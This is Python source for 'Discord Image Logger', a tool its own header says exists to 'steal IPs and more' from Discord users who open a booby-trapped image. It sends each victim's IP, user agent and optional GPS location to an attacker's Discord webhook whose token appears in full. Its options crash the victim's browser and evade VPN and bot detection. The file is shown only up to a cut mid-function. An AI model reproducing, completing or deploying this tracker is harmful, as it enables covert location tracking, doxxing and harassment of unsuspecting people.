# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1123421541502304436/QmTtXUqKoNvyL5mnIR04NgWAM9ivBgaG64POqYTXOuLgeAddZ8DYAnCR5BnPWywKtKAO",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
